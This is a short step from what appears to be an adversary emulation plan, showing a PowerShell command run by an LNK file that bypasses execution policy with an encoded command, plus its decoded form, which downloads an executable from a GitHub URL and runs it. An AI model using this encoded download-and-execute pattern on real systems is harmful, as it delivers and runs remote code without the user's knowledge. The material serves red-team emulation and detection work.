


# Step 9
This LNK will run the following powershell command line:

```powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JAB1AHIAbAA9ACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBTAGEAbQAwAHgAOQAwAC8AQwBUAEkALwByAGEAdwAvAG0AYQBpAG4ALwBBAGQAdgBlAHIAcwBhAHIAeQAlADIAMABFAG0AdQBsAGEAdABpAG8AbgAlADIAMABQAGwAYQBuAHMALwAyADAAMgAyAF8AVABvAHAAMwA1AF8ATQBpAHQAcgBlAC8AYwBhAGwAYwAuAGUAeABlACIAOwAkAHAAYQB0AGgAPQAiAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAYwBhAGwAYwAuAGUAeABlACIAOwBpAHcAcgAgAC0AdQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABwAGEAdABoADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAJABwAGEAdABoAA==```

This is the decoded command: 

```$url="https://github.com/Sam0x90/CTI/raw/main/Adversary%20Emulation%20Plans/2022_Top35_Mitre/calc.exe";$path="C:\Users\Public\calc.exe";iwr -uri $url -OutFile $path;Start-Process -FilePath $path```
